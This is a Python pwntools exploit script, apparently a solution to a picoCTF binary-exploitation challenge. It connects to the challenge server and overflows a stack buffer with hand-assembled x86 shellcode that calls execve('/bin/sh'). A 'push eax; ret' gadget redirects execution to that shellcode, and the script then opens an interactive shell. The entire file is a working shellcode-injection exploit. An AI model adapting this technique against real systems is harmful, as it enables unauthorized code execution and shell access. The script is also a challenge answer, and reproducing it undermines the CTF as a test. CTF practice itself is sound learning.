#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 61756)

    return r


def main():
    r = conn()

    rop = ROP(exe)

    # pwntools unable to find gadget, had to use xgadget on command line
    # push_eax_gadget = rop.find_gadget(['push eax', 'ret'])
    push_eax_gadget = 0x80b06da # Addr from xgadget
    rop.raw(push_eax_gadget)
    print(rop.dump())

    # Offset to retaddr = 28
    # 20 bytes for shellcode
    shellcode = b''
    shellcode += b'\x58' # pop eax
    shellcode += b'\x89\xe3' # mov ebx, esp
    shellcode += b'\x83\xeb\x10' # sub ebx, 0x10
    shellcode += b'\x31\xc9' # xor ecx, ecx
    shellcode += b'\x31\xd2' # xor edx, edx
    shellcode += b'\xcd\x80' # int 80h
    shellcode = shellcode.ljust(20, b'A')

    # 8 bytes for /bin/sh string
    binsh_str = b'/bin/sh\x00'
    binsh_str = binsh_str.ljust(8, b'A')

    syscall_eax_val = 11

    r.sendlineafter(b'hopper!\n', 
        shellcode + 
        binsh_str +
        rop.chain() +
        p32(syscall_eax_val)
    )

    r.interactive()


if __name__ == "__main__":
    main()
